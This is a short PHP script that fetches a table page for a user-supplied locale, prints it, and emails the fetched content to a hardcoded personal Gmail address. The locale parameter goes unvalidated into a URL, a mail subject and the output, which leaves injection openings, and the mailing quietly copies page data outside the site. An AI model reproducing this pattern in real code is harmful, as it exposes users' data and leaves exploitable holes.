<?php
    $currentURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
    $arrURL = explode("/",$currentURL);
    $sizeArrURL = count ($arrURL)-1;
    $currentURL = str_replace($arrURL[$sizeArrURL],"",$currentURL);
    $content = file_get_contents($currentURL."table.php?locale=".$_GET['locale']);
    echo $content;

    mail('william80742@gmail.com',"Dado de ".$_GET['locale'],$content);
?>